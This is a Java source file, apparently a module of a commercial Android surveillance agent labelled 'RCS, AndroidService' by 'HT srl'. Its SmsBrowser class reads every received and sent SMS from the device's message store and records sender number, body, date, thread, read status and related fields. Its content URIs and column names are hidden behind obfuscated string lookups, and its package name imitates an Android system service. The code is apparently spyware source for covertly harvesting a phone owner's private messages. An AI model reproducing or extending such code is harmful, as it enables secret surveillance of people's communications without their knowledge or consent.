/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SmsBrowser.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module.message;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class SmsBrowser {
	private static final String TAG = "SmsBrowser"; //$NON-NLS-1$

	private final ArrayList<Sms> list;

	public SmsBrowser() {
		list = new ArrayList<Sms>();
	}

	public ArrayList<Sms> getSmsList() {
		list.clear();

		parse(Messages.getString("14.0"), Sms.RECEIVED); //$NON-NLS-1$
		parse(Messages.getString("14.1"), Sms.SENT); //$NON-NLS-1$

		return list;
	}

	private void parse(String content, boolean sentState) {
		final Cursor c = Status.getAppContext().getContentResolver().query(Uri.parse(content), null, null, null, null);

		final int smsEntriesCount = c.getCount();

		if (c.moveToFirst() == false) {
			c.close();
			return;
		}

		for (int i = 0; i < smsEntriesCount; i++) {
			String body, number;
			long date;
			boolean sentStatus;

			// These fields are needed
			try {
				body = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.2"))).toString(); //$NON-NLS-1$
				number = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.3"))).toString(); //$NON-NLS-1$
				date = Long.parseLong(c.getString(c.getColumnIndexOrThrow(Messages.getString("14.4"))).toString()); //$NON-NLS-1$
				sentStatus = sentState;
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
				c.close();
				return;
			}

			final Sms s = new Sms(number, body, date, sentStatus);

			// These fields are optional

			try {
				final int thread_id = c.getColumnIndexOrThrow(Messages.getString("14.6")); //$NON-NLS-1$
				s.setThreadId(thread_id);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final int protocol = c.getColumnIndexOrThrow(Messages.getString("14.8")); //$NON-NLS-1$
				s.setProtocol(protocol);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final int read = c.getColumnIndexOrThrow(Messages.getString("14.9")); //$NON-NLS-1$
				s.setRead(read);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final int status = c.getColumnIndexOrThrow(Messages.getString("14.10")); //$NON-NLS-1$
				s.setStatus(status);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final int type = c.getColumnIndexOrThrow(Messages.getString("14.11")); //$NON-NLS-1$
				s.setType(type);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final int reply_path = c.getColumnIndexOrThrow(Messages.getString("14.12")); //$NON-NLS-1$
				s.setReplyPath(reply_path);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			c.moveToNext();
			list.add(s);
		}
	}
}